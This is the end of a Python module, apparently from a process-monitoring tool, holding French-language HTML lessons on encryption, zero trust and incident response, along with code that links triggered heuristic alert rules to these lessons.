                <p><strong>Conclusion</strong> : Firewall = nécessaire mais pas suffisant</p>
                """,
                difficulty="beginner",
                duration_minutes=13,
                tags=["firewall", "network", "defense", "rules"],
                created_at=datetime.now().isoformat()
            ),
            
            "encryption_basics": LearningResource(
                id="encryption_basics",
                title="Chiffrement : Protéger Vos Données",
                category="file",
                description="Comprendre le chiffrement et le déchiffrement des données",
                content="""
                <h3>Chiffrement : Rendre les Données Illisibles</h3>
                
                <h4>Concept Basique</h4>
                <p><strong>Chiffrement</strong> = Transformer données lisibles (plaintext) en données illisibles (ciphertext)
                SEULEMENT quelqu'un avec la clé peut déchiffrer</p>
                
                <h5>Formule Simple</h5>
                <pre>
Plaintext (clair) + Clé = Chiffrement = Ciphertext (crypté)
Ciphertext + Clé = Déchiffrement = Plaintext
                </pre>
                
                <h4>Deux Types de Chiffrement</h4>
                
                <h5>1. Chiffrement Symétrique (Même Clé)</h5>
                <p>Expéditeur et destinataire utilisent LA MÊME clé</p>
                <ul>
                    <li>⚡ Très RAPIDE (algorithmes simples)</li>
                    <li>💪 Sûr si clé reste secrète</li>
                    <li>❌ Problème : Comment partager la clé en sécurité ?</li>
                </ul>
                
                <p><strong>Exemples</strong> : AES-256 (standard), DES (old), Blowfish</p>
                
                <h5>Cas d'Usage</h5>
                <ul>
                    <li>💾 Chiffrer disque dur : BitLocker, VeraCrypt, LUKS</li>
                    <li>📁 Chiffrer fichiers : 7z, WinRAR, tar+GPG</li>
                    <li>📱 Chiffrer messages : Signal, WhatsApp (E2E)</li>
                </ul>
                
                <h5>2. Chiffrement Asymétrique (Deux Clés)</h5>
                <p>Clé publique (partager partout) + Clé privée (SECRET)</p>
                <ul>
                    <li>🔐 Clé publique = cadenas ouvert (tout le monde peut enfermer)</li>
                    <li>🔑 Clé privée = clé du cadenas (VOUS SEUL pouvez ouvrir)</li>
                    <li>⚙️ Plus LENT que symétrique mais aucun secret à partager</li>
                    <li>✅ Permet signature numérique (prouver que c'est vous)</li>
                </ul>
                
                <p><strong>Exemples</strong> : RSA, ECDSA, ElGamal</p>
                
                <h5>Comment Ça Marche</h5>
                <pre>
Alice → Veut envoyer secret à Bob
1. Bob génère : Private Key (secret) + Public Key (partager)
2. Bob publie sa Public Key sur Internet
3. Alice télécharge Public Key de Bob
4. Alice chiffre message AVEC Public Key de Bob
5. Alice envoie message crypté
6. Bob reçoit, déchiffre AVEC sa Private Key
7. Bob lit le message ✓
</pre>
                <p>Même si attaquant intercepce le message = ne peut pas déchiffrer</p>
                
                <h4>Hybrid Encryption (Meilleur des Deux Mondes)</h4>
                <p>HTTPS et GPG utilisent les deux</p>
                <ul>
                    <li>1. Chiffrement asymétrique = échanger clé symétrique en sécurité</li>
                    <li>2. Chiffrement symétrique = communiquer rapidement</li>
                </ul>
                
                <h4>Algorithmes Recommandés</h4>
                <table border="1" cellpadding="8">
                    <tr>
                        <th>Utilisation</th>
                        <th>Algorithme</th>
                        <th>Taille Clé</th>
                        <th>Statut</th>
                    </tr>
                    <tr>
                        <td>Données (symétrique)</td>
                        <td>AES</td>
                        <td>256 bits</td>
                        <td>✅ Sûr</td>
                    </tr>
                    <tr>
                        <td>Clés (asymétrique)</td>
                        <td>RSA</td>
                        <td>4096 bits</td>
                        <td>✅ OK</td>
                    </tr>
                    <tr>
                        <td>Clés (asymétrique moderne)</td>
                        <td>ECDSA</td>
                        <td>256 bits</td>
                        <td>✅ Meilleur</td>
                    </tr>
                    <tr>
                        <td>Hash (résumé)</td>
                        <td>SHA-256</td>
                        <td>256 bits</td>
                        <td>✅ Sûr</td>
                    </tr>
                </table>
                
                <h4>Cas Réel : HTTPS (Web Sécurisé)</h4>
                <pre>
1. Client → Server : "Bonjour, parlons de façon sécurisée"
2. Server → Client : Certificate (contient Public Key)
3. Client vérifie : "Ce certificat vient d'une autorité de confiance ?"
4. Client génère clé aléatoire symétrique
5. Client chiffre AVEC Public Key du server → envoie
6. Server déchiffre AVEC sa Private Key → récupère clé symétrique
7. Maintenant : Tous les données chiffrées AVEC clé symétrique
8. 🔐 Communication sécurisée établie ✓
</pre>
                
                <h4>Outils de Chiffrement Quotidiens</h4>
                <ul>
                    <li>💾 <strong>BitLocker</strong> (Windows) : Chiffrer disque</li>
                    <li>🍎 <strong>FileVault</strong> (Mac) : Chiffrer disque</li>
                    <li>🐧 <strong>LUKS</strong> (Linux) : Chiffrer partition</li>
                    <li>📁 <strong>VeraCrypt</strong> : Conteneur chiffré (cross-platform)</li>
                    <li>💬 <strong>Signal</strong> : Chat chiffré de bout en bout</li>
                    <li>✉️ <strong>ProtonMail</strong> : Email chiffré</li>
                </ul>
                """,
                difficulty="intermediate",
                duration_minutes=15,
                tags=["encryption", "cryptography", "aes", "rsa", "https"],
                created_at=datetime.now().isoformat()
            ),
            
            "zero_trust_security": LearningResource(
                id="zero_trust_security",
                title="Zero Trust : Ne Faire Confiance à Personne",
                category="network",
                description="Architecture de sécurité moderne basée sur la vérification continue",
                content="""
                <h3>Zero Trust Architecture : Vérifier Chaque Accès</h3>
                
                <h4>Paradigme Traditionnel (Périmétrique)</h4>
                <pre>
┌─────────────────────────┐
│  INTERNE (Faire confiance)     
│  ┌───────┐ ┌───────┐
│  │ User1 │ │ User2 │
│  └───────┘ └───────┘
└─────────────────────────┘
      🚪 FIREWALL
┌─────────────────────────┐
│  EXTERNE (Bloquer tout)
│ Attaquants, Internet...
└─────────────────────────┘
</pre>
                <p><strong>Principe</strong> : "Ce qui est inside = confiance, outside = danger"</p>
                <p><strong>Problème</strong> : Un insider malveillant = complete trust → catastrophe</p>
                
                <h4>Zero Trust (Nouvelle Philosophie)</h4>
                <pre>
"Ne faites confiance à personne. Vérifiez tout. Toujours."
</pre>
                <ul>
                    <li>❌ Pas de distinction inside/outside</li>
                    <li>✅ Chaque accès = authentification + autorisation</li>
                    <li>✅ Microsegmentation : Chaque service isolé</li>
                    <li>✅ Logging et monitoring de tout</li>
                </ul>
                
                <h4>Les 7 Piliers du Zero Trust</h4>
                
                <h5>1. Identité Forte</h5>
                <p>Prouver QUI vous êtes avec certitude absolue</p>
                <ul>
                    <li>✅ MFA (Multi-Factor Authentication) : Quelque chose que vous avez/êtes</li>
                    <li>✅ Certificate-based auth : Certificat numérique</li>
                    <li>✅ Biométrie : Fingerprint, face recognition</li>
                </ul>
                
                <h5>2. Devices Sûrs</h5>
                <p>Vérifier l'état de CHAQUE appareil</p>
                <ul>
                    <li>✅ Scan de compliance : OS à jour ? Antivirus actif ?</li>
                    <li>✅ Device fingerprinting : Reconnaître chaque PC</li>
                    <li>✅ Isolation de device compromis</li>
                </ul>
                
                <h5>3. Network Segmentation</h5>
                <p>Diviser réseau en petites zones → isoler la compromission</p>
                <pre>
┌─────────────────────────────────────┐
│ Finance     │ Dev        │ Public
│ ┌────────┐  │ ┌────────┐ │ ┌────────┐
│ │ Server │  │ │ Server │ │ │ Web   │
│ └────────┘  │ └────────┘ │ └────────┘
└─────────────────────────────────────┘
 Micro-segment à micro-segment = Trafic limité
</pre>
                
                <h5>4. Encryption Partout</h5>
                <ul>
                    <li>🔐 En transit (TLS/HTTPS)</li>
                    <li>🔐 Au repos (AES-256)</li>
                    <li>🔐 End-to-End (chiffrement bout à bout)</li>
                </ul>
                
                <h5>5. Least Privilege</h5>
                <p>Donner accès MINIMAL nécessaire pour faire le job</p>
                <ul>
                    <li>👤 User = pas admin par défaut</li>
                    <li>👤 Appli = only files she needs</li>
                    <li>👤 Service = unique credentials, temporary access</li>
                </ul>
                
                <h5>6. Monitoring & Analytics</h5>
                <p>Surveiller TOUS les accès et alerter sur anomalies</p>
                <ul>
                    <li>📊 Behavioral analytics : Détecte actions anormales</li>
                    <li>📊 SIEM (Security Information Event Management) : Centraliser logs</li>
                    <li>📊 EDR (Endpoint Detection Response) : Surveiller endpoints</li>
                </ul>
                
                <h5>7. Verify on Every Access</h5>
                <p>À CHAQUE fois qu'un user/app accède une ressource</p>
                <ul>
                    <li>✅ Re-check identité</li>
                    <li>✅ Re-check device state</li>
                    <li>✅ Re-check permissions</li>
                    <li>✅ Re-check risk niveau</li>
                </ul>
                
                <h4>Implémentation Pratique</h4>
                
                <h5>Étape 1 : Visibilité</h5>
                <p>Savoir QUI accède QUOI et QUAND</p>
                <ul>
                    <li>→ Déployer SIEM</li>
                    <li>→ Activer audit logging</li>
                    <li>→ Classifier assets (critique vs normal)</li>
                </ul>
                
                <h5>Étape 2 : Authentification Forte</h5>
                <ul>
                    <li>→ Déployer MFA pour administrateurs</li>
                    <li>→ Migrer à SSO (Single Sign-On)</li>
                    <li>→ Implémenter TOTP ou hardware keys</li>
                </ul>
                
                <h5>Étape 3 : Microsegmentation</h5>
                <ul>
                    <li>→ Identifier traffic flows critiques</li>
                    <li>→ Définir allow-list de trafic</li>
                    <li>→ Bloquer tout sauf whitelist</li>
                </ul>
                
                <h4>Bénéfices du Zero Trust</h4>
                <ul>
                    <li>✅ Réduit surface d'attaque dramatiquement</li>
                    <li>✅ Rapide détection des intrusions (grâce monitoring continu)</li>
                    <li>✅ Limite dégâts si compromission (isolation rapide)</li>
                    <li>✅ Confiance justifiée (basée sur vérification, pas assomption)</li>
                </ul>
                """,
                difficulty="advanced",
                duration_minutes=16,
                tags=["zero-trust", "security-architecture", "mfa", "defense"],
                created_at=datetime.now().isoformat()
            ),
            
            "incident_response": LearningResource(
                id="incident_response",
                title="Répondre à une Cyberattaque : Plan d'Action",
                category="process",
                description="Procédure étape par étape pour gérer une incident de sécurité",
                content="""
                <h3>Incident Response : Réagir Rapidement & Correctement</h3>
                
                <h4>Pourquoi un Plan d'Incident Response ?</h4>
                <p>La différence entre une "boo boo" et une catastrophe = vitesse de réaction</p>
                <ul>
                    <li>⏱️ Chaque minute compte : Limite les dégâts</li>
                    <li>📋 Plan = pas de panique, pas de décisions improvisées</li>
                    <li>💰 Réduit coût moyen d'une breach de 50%+</li>
                </ul>
                
                <h4>Phases du Incident Response</h4>
                
                <h5>Phase 1 : PREPARATION (Avant Attaque)</h5>
                <p>🛡️ Mettre en place l'infrastructure et les processus</p>
                
                <p><strong>Checklist</strong> :</p>
                <ul>
                    <li>✅ Former une équipe IR (Incident Response)</li>
                    <li>✅ Nommer un incident commander</li>
                    <li>✅ Mettre en place monitoring 24/7</li>
                    <li>✅ Documenter tous les systèmes critiques</li>
                    <li>✅ Créer backups isolés (hors ligne)</li>
                    <li>✅ Établir protocoles de communication</li>
                    <li>✅ Avoir contacts d'urgence (legal, PR, CEO, police cyber)</li>
                </ul>
                
                <h5>Phase 2 : DETECTION & ANALYSIS (Ça se passe!)</h5>
                <p>🚨 Détecter et analyser l'incident</p>
                
                <p><strong>Actions</strong> :</p>
                <ol>
                    <li>📍 <strong>Détecter</strong> : Alerte SIEM? EDR? Utilisateur report?</li>
                    <li>📊 <strong>Valider</strong> : C'est vraiment une attaque ou false positive?</li>
                    <li>🔍 <strong>Analyser</strong> :
                        <ul>
                            <li>Quand ça a commencé?</li>
                            <li>Quels systèmes affectés?</li>
                            <li>Qui est impliqué? (Attaquant, insider, accident?)</li>
                            <li>Quel est le vecteur d'attaque? (Phishing? Vuln?)</li>
                            <li>Quelles données accédées/exfiltrées?</li>
                        </ul>
                    </li>
                    <li>⚠️ <strong>Classifier sévérité</strong> :
                        <ul>
                            <li>Niveau 1 = Critique (systèmes down, données sensibles)</li>
                            <li>Niveau 2 = Majeur (performance dégradée)</li>
                            <li>Niveau 3 = Mineur (tentative échouée)</li>
                        </ul>
                    </li>
                </ol>
                
                <h5>Phase 3 : CONTAINMENT (Arrêter la Saignée)</h5>
                <p>🔒 Isoler l'incident et empêcher propagation</p>
                
                <p><strong>Short-term Containment</strong> :</p>
                <ul>
                    <li>🔌 Déconnecter machines compromises du réseau (non shutdown = préserver logs)</li>
                    <li>🔐 Changer tous les mots de passe (surtout admin/service accounts)</li>
                    <li>🚪 Revoquer tokens/sessions actifs</li>
                    <li>🔥 Bloquer IP/domaines attaquant connus</li>
                    <li>📵 Désactiver comptes compromises</li>
                </ul>
                
                <p><strong>Long-term Containment</strong> :</p>
                <ul>
                    <li>Patch vulnerabilités exploitées</li>
                    <li>Renforcer configurations</li>
                    <li>Ajouter monitoring du vecteur d'attaque</li>
                </ul>
                
                <h5>Phase 4 : ERADICATION (Nettoyer)</h5>
                <p>🧹 Supprimer malware et accès attaquant</p>
                
                <ul>
                    <li>🔍 Scan complet antivirus/malware</li>
                    <li>🔍 Vérifier persistence mechanisms (registre, crontab, kernel modules)</li>
                    <li>🔍 Vérifier backdoors/tunnels (SSH keys, cron jobs, scheduled tasks)</li>
                    <li>⚙️ Si persistance = Rebuild machine from scratch (image propre)</li>
                    <li>🔑 Changer TOUTES les credentials une deuxième fois</li>
                </ul>
                
                <h5>Phase 5 : RECOVERY (Retour à la Normal)</h5>
                <p>✅ Restaurer services et vérifier propreté</p>
                
                <ul>
                    <li>✓ Redémarrer machines une par une</li>
                    <li>✓ Monitoring continu : Vérifier pas d'activité malveillante</li>
                    <li>✓ Valider avec utilisateurs : "Ça fonctionne ?"</li>
                    <li>✓ Restaurer depuis backups SEULEMENT si on est SÛRS qu'ils sont propres</li>
                </ul>
                
                <h5>Phase 6 : POST-INCIDENT (Apprendre)</h5>
                <p>📚 Améliorer et ne pas répéter</p>
                
                <ul>
                    <li>📋 Créer rapport complet (timeline, cause root, impact)</li>
                    <li>📋 Lessons learned : Qu'on aurait pu faire mieux?</li>
                    <li>📋 Recommandations : Futures changements</li>
                    <li>👥 Partager avec l'équipe (debriefing)</li>
                    <li>🔄 Mettre à jour IR plan basé sur apprentissages</li>
                </ul>
                
                <h4>Checklist Rapide d'Incident Response</h4>
                <pre>
☐ DÉCOUVRIR → Valider l'incident
☐ RÉAGIR → Commander nommé, équipe mobilisée
☐ ANALYSER → Scope? Vecteur? Données?
☐ ISOLER → Déconnecter machines compromises
☐ CONTAINMENT → Changer credentials, bloquer attaquant
☐ ERADICATION → Nettoyer, rembuilder
☐ RECOVERY → Restaurer services
☐ RAPPORT → Apprendre et améliorer
                </pre>
                
                <h4>Communication Pendant Incident</h4>
                <ul>
                    <li>👥 <strong>Interne</strong> : Leadership + équipes affectées</li>
                    <li>⚖️ <strong>Legal</strong> : Respecter obligations de notification</li>
                    <li>👤 <strong>Clients/Users</strong> : Transparent (si donnés compromises)</li>
                    <li>🚓 <strong>Police Cyber</strong> : Signaler crimes (obligation)</li>
                    <li>🤐 <strong>Presse</strong> : Pas avant que internal soit sûr</li>
                </ul>
                
                <h4>Outils & Ressources</h4>
                <ul>
                    <li>📋 NIST Cybersecurity Framework : Standard IR process</li>
                    <li>🔍 Wireshark : Analyser trafic réseau</li>
                    <li>🔍 YARA : Détecter malware signatures</li>
                    <li>💾 Volatility : Analyser memory dumps</li>
                    <li>🗂️ Cortex / Hive : Cas management</li>
                </ul>
                """,
                difficulty="advanced",
                duration_minutes=18,
                tags=["incident-response", "forensics", "crisis", "recovery"],
                created_at=datetime.now().isoformat()
            ),
        }

    def create_alert(
        self,
        process_id: int,
        process_name: str,
        severity: str,
        title: str,
        message: str,
        triggered_rules: List[str],
    ) -> SecurityAlert:
        """
        Crée une alerte de sécurité et l'associe à des ressources d'apprentissage.
        
        Args:
            process_id: PID du processus
            process_name: Nom du processus
            severity: "info", "warning", "critical"
            title: Titre court
            message: Message détaillé
            triggered_rules: Liste des règles heuristiques déclenchées
        
        Returns:
            SecurityAlert créée
        """
        alert_id = f"alert_{self.alert_counter}_{process_id}_{int(datetime.now().timestamp())}"
        self.alert_counter += 1

        # Mappe règles heuristiques → ressources d'apprentissage
        resource_mapping = {
            "PATH_TMP": "malware_tmp_execution",
            "PATH_DOWNLOADS": "malware_tmp_execution",
            "NETWORK_SUSPICIOUS_IP": "network_suspicious_ip",
            "NETWORK_MANY_CONN": "network_suspicious_ip",
            "PRIV_ESCALATION": "privilege_escalation",
            "ADMIN_PRIVILEGE": "privilege_escalation",
            "UNSIGNED_BINARY": "unsigned_binary",
            "INTEGRITY_FAIL": "unsigned_binary",
            "HIGH_CPU": "process_monitoring",
            "HIGH_MEMORY": "process_monitoring",
        }

        learning_resources = []
        for rule in triggered_rules:
            if rule in resource_mapping:
                resource_id = resource_mapping[rule]
                if resource_id not in learning_resources:
                    learning_resources.append(resource_id)

        # Si aucune ressource mappée, proposer du monitoring général
        if not learning_resources:
            learning_resources.append("process_monitoring")

        alert = SecurityAlert(
            id=alert_id,
            timestamp=datetime.now().isoformat(),
            process_id=process_id,
            process_name=process_name,
            severity=severity,
            title=title,
            message=message,
            triggered_rules=triggered_rules,
            learning_resources=learning_resources,
        )

        self.alerts[alert_id] = alert
        return alert

    def get_alert(self, alert_id: str) -> Optional[SecurityAlert]:
        """Récupère une alerte par ID."""
        return self.alerts.get(alert_id)

    def get_recent_alerts(self, limit: int = 20) -> List[SecurityAlert]:
        """Récupère les N dernières alertes."""
        alerts_list = list(self.alerts.values())
        # Trier par timestamp décroissant
        alerts_list.sort(key=lambda x: x.timestamp, reverse=True)
        return alerts_list[:limit]

    def get_alerts_by_severity(self, severity: str) -> List[SecurityAlert]:
        """Filtre les alertes par sévérité."""
        return [a for a in self.alerts.values() if a.severity == severity]

    def get_learning_resource(self, resource_id: str) -> Optional[LearningResource]:
        """Récupère une ressource d'apprentissage par ID."""
        return self.resources.get(resource_id)

    def get_all_learning_resources(self) -> List[LearningResource]:
        """Retourne toutes les ressources d'apprentissage."""
        return list(self.resources.values())

    def get_learning_resources_by_category(self, category: str) -> List[LearningResource]:
        """Filtre les ressources par catégorie."""
        return [r for r in self.resources.values() if r.category == category]

    def get_learning_resources_by_difficulty(self, difficulty: str) -> List[LearningResource]:
        """Filtre les ressources par difficulté."""
        return [r for r in self.resources.values() if r.difficulty == difficulty]


# Test du module
if __name__ == "__main__":
    learning = LearningModule()

    # Créer une alerte de test
    alert = learning.create_alert(
        process_id=1234,
        process_name="suspicious.exe",
        severity="critical",
        title="Processus suspect détecté",
        message="Exécution depuis /tmp avec connexion à IP malveillante",
        triggered_rules=["PATH_TMP", "NETWORK_SUSPICIOUS_IP"],
    )

    print(f"✓ Alerte créée: {alert.id}")
    print(f"  Ressources d'apprentissage liées: {alert.learning_resources}")

    # Récupérer les ressources
    for res_id in alert.learning_resources:
        res = learning.get_learning_resource(res_id)
        if res:
            print(f"\n📚 {res.title}")
            print(f"   Difficulté: {res.difficulty} | {res.duration_minutes}min")

    # Lister toutes les catégories
    print("\n📖 Toutes les ressources disponibles:")
    for res in learning.get_all_learning_resources():
        print(f"  - {res.title} ({res.category})")
